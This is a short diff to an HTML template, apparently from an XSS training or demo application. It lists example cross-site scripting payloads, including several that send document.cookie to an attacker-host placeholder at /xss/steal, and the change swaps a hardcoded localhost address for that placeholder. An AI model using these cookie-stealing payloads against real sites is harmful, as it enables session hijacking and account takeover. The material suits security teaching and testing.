@@ -16,7 +16,7 @@
             <li>&lt;script&gt;alert('Hello XSS!')&lt;/script&gt;</li>
             <li>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</li>
             <li>&lt;script&gt;%24.get%28%27<span th:text="${hackSite}"></span>%2Fxss%2Fsteal%27%2C+%7Bcookie%3A+document.cookie%7D%29&lt;/script&gt;</li>
-            <li><span th:text="${site}"></span>/xss/search?searchKey=%3Cscript%3E%24.get%28%27http%3A%2F%2Flocalhost%3A9090%2Fxss%2Fsteal%27%2C+%7Bcookie%3A+document.cookie%7D%29%3C/script%3E</li>
+            <li><span th:text="${site}"></span>/xss/search?searchKey=%3Cscript%3E%24.get%28%27<span th:text="${hackSite}"></span>%2Fxss%2Fsteal%27%2C+%7Bcookie%3A+document.cookie%7D%29%3C/script%3E</li>
             <li>&lt;script&gt;$.get('<span th:text="${hackSite}"></span>/xss/steal', {cookie: document.cookie})&lt;/script&gt;</li>
         </ul>
 
